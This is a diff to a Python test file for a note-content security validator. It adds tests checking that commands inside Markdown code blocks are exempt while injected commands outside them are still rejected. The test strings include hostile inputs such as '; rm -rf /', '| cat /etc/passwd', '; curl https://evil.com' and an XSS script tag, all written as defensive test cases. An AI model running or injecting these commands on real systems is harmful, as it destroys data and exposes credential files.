@@ -435,12 +435,58 @@ class TestSecurityPatterns:
             "; ls -la",
             "| cat /etc/passwd",
             "& whoami",
-            "`id`",
         ]
 
         for pattern in command_patterns:
             with pytest.raises(SecurityError):
                 self.validator.validate_note_content(pattern)
+
+    def test_code_block_exemption(self):
+        """Commands inside Markdown code blocks should not trigger security errors."""
+        # Inline code
+        self.validator.validate_note_content("Run `curl https://example.com` to test")
+        # Fenced code block
+        self.validator.validate_note_content(
+            "Example:\n```\ncurl https://example.com\nchmod +x script.sh\n```\n"
+        )
+        # Language-annotated fenced code block
+        self.validator.validate_note_content(
+            "```bash\nwget https://example.com/file.tar.gz\n```"
+        )
+        # Multiple code blocks in one note
+        self.validator.validate_note_content(
+            "Step 1:\n```\ncurl -O https://a.com\n```\n"
+            "Step 2:\n```\nchmod +x install.sh && bash install.sh\n```\n"
+        )
+        # All pattern categories inside code blocks should be exempt
+        self.validator.validate_note_content("SQL example: `SELECT * FROM users`")
+        self.validator.validate_note_content("```\n<script>alert('xss')</script>\n```")
+        self.validator.validate_note_content("Path example: `../../etc/passwd`")
+        # Mixed: dangerous content in code block + safe prose outside
+        self.validator.validate_note_content(
+            "Use this command to download:\n```\ncurl https://example.com\n```\n"
+            "Then open the file in your editor."
+        )
+        # Bare dangerous commands outside code blocks should still be caught
+        with pytest.raises(SecurityError):
+            self.validator.validate_note_content("; curl https://evil.com")
+
+    def test_code_block_exemption_does_not_hide_real_attacks(self):
+        """Dangerous content outside code blocks must still be detected."""
+        # Dangerous content after a code block
+        with pytest.raises(SecurityError):
+            self.validator.validate_note_content("```\nsome safe code\n```\n; rm -rf /")
+        # Dangerous content before a code block
+        with pytest.raises(SecurityError):
+            self.validator.validate_note_content("; wget evil.com\n```\nsafe code\n```")
+        # Dangerous content between two code blocks
+        with pytest.raises(SecurityError):
+            self.validator.validate_note_content(
+                "```\nsafe\n```\n| cat /etc/passwd\n```\nalso safe\n```"
+            )
+        # Unclosed fence must not suppress detection of dangerous content
+        with pytest.raises(SecurityError):
+            self.validator.validate_note_content("```\n; rm -rf /")
 
     def test_ldap_injection_patterns(self):
         """Test LDAP injection pattern detection."""
